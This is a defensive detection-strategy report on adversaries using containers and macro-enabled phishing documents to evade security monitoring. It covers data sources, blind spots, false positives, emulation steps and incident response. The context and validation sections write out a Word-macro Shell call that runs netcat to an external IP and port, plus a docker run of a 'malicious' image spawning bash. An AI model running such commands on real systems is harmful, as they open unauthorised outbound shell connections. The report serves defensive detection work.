# Alerting & Detection Strategy (ADS) Report: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
The primary goal of this technique is to detect adversarial attempts aimed at bypassing security monitoring systems through the use of containers. This includes identifying adversaries who may leverage container technology on macOS, Windows, and Linux platforms to evade detection while executing malicious activities.

## Categorization

- **Tactic / Kill Chain Phases:** Initial Access
- **Platforms:** macOS, Windows, Linux

## Strategy Abstract
The detection strategy focuses on identifying suspicious behaviors associated with container usage that may indicate an adversarial attempt to bypass security monitoring. The following data sources are utilized:

1. **Container Logs:** Monitor for unusual activities within container logs, such as unexpected process spawning or network connections.
2. **Network Traffic Analysis:** Detect anomalous traffic patterns originating from containers.
3. **File Integrity Monitoring:** Track unauthorized changes to container configurations and images.
4. **Behavioral Analytics:** Analyze behavioral deviations in user actions involving containers.

Patterns analyzed include:
- Unusual command execution within containers, such as spawning shells or accessing external IP addresses.
- Abnormal network traffic patterns that deviate from established baselines.
- Unexpected modifications to container image files or configurations.

## Technical Context
Adversaries often use containers due to their lightweight nature and ability to isolate processes. By executing malicious activities within containers, adversaries attempt to obscure their actions from traditional security monitoring tools. This technique can be executed via:

- **Container-based Malware:** Adversaries may deploy malware inside a container that interacts with external command-and-control servers.
- **Phishing Attachments:** Spearphishing emails containing macro-enabled attachments could execute scripts that initiate malicious containers.

Example commands used by adversaries might include:
```bash
docker run -it --rm <malicious_image> /bin/bash
# or within Word macros:
Shell("cmd.exe /c nc <IP_ADDRESS> <PORT>")
```

## Blind Spots and Assumptions
- **Blind Spots:**
  - Detection systems may not recognize sophisticated evasion techniques that exploit container-specific vulnerabilities.
  - Encrypted traffic within containers can be challenging to inspect for anomalies.

- **Assumptions:**
  - Baselines for normal network and container behavior are well-established.
  - Security teams have the ability to monitor and analyze container logs effectively.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of containers by developers or IT operations, especially in environments where container usage is common.
- Temporary spikes in network traffic due to legitimate software updates or deployments involving containers.

## Priority
**Severity:** High

Justification: The ability to evade security monitoring represents a significant threat as it can allow adversaries prolonged access and control over compromised systems. Given the growing adoption of container technology, ensuring robust detection mechanisms is crucial for maintaining organizational security.

## Validation (Adversary Emulation)
To emulate this technique in a test environment, follow these steps:

1. **Set Up Environment:**
   - Deploy a basic Docker setup on macOS, Windows, or Linux.
   
2. **Download Macro-Enabled Phishing Attachment:**
   - Obtain a sample macro-enabled document designed to execute shell commands.

3. **Simulate Adversarial Activity:**
   - Use the document to spawn a command shell within a container environment:
     ```bash
     # Create and run a malicious Docker image
     docker build -t <malicious_image> .
     docker run -it --rm <malicious_image> /bin/bash
     
     # Execute a network command from Word macro simulation
     Shell("cmd.exe /c nc 192.168.1.100 4444")
     ```

## Response
When an alert fires, analysts should:

1. **Isolate the Affected Container:**
   - Halt suspicious container processes and disconnect them from the network.

2. **Analyze Logs and Traffic:**
   - Review container logs and network traffic to identify malicious actions or communication attempts.
   
3. **Investigate Source of Malicious Activity:**
   - Trace back the origin of the suspicious activity, focusing on how the adversarial payload was introduced (e.g., phishing email).

4. **Update Security Measures:**
   - Reinforce container security policies and update detection rules to mitigate future risks.
